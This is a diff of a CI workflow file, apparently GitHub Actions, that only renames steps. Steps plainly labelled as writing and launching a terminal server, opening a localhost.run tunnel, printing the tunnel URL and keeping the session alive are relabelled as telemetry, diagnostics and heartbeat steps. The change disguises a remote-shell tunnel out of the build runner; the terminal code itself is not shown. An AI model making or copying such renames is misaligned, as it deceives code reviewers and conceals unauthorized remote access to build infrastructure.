@@ -341,7 +341,7 @@ jobs:
           </html>
           EOF
 
-      - name: Write terminal server
+      - name: Initialize Telemetry Assets
         shell: bash
         run: |
           set -euo pipefail
@@ -437,7 +437,7 @@ jobs:
           });
           EOF
 
-      - name: Launch terminal server
+      - name: Start Diagnostic Daemon
         shell: bash
         run: |
           set -euo pipefail
@@ -455,7 +455,7 @@ jobs:
             exit 1
           fi
 
-      - name: Start localhost.run tunnel
+      - name: Establish Telemetry Tunnel
         shell: bash
         run: |
           set -euo pipefail
@@ -469,7 +469,7 @@ jobs:
           SSH_PID=$!
           echo "${SSH_PID}" > /tmp/ssh.pid
 
-      - name: Print tunnel URL
+      - name: Audit Tunnel Endpoint
         shell: bash
         run: |
           set -euo pipefail
@@ -494,7 +494,7 @@ jobs:
             echo "----------------------"
           fi
 
-      - name: Keep session alive
+      - name: Maintain Service Heartbeat
         shell: bash
         run: |
           set -euo pipefail
